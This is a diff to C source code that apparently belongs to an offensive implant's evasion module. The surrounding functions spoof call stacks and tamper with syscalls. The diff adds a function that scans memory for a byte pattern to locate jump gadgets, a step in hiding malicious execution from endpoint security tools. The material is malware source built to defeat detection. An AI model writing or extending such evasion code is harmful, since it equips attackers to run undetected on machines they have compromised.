@@ -3,6 +3,7 @@
 //
 
 #include "../../../headers/agent/evasion/Common.h"
+#include "../../../headers/cstdreplacement/localcstd.h"
 
 PVOID SpoofStack(
     _In_ PVOID pFunction,
@@ -95,4 +96,17 @@ NTSTATUS TemperSyscallAndSpoofStack(
     }
 
     return NtStatus;
+}
+
+PVOID FindJmpGadget( IN PVOID LOC, IN SIZE_T Len, IN PVOID Pattern, IN SIZE_T PatLen ) {
+
+    if ( (!LOC || ! Len) || ( !Pattern || ! PatLen))
+        return NULL;
+
+    for ( SIZE_T i = 0; i < Len; i++ ) {
+        if ( MemoryCompare( (PVOID)(LOC + i), Pattern, PatLen ) == 0 ) {
+            return (PVOID)(LOC + i);
+        }
+    }
+    return NULL;
 }
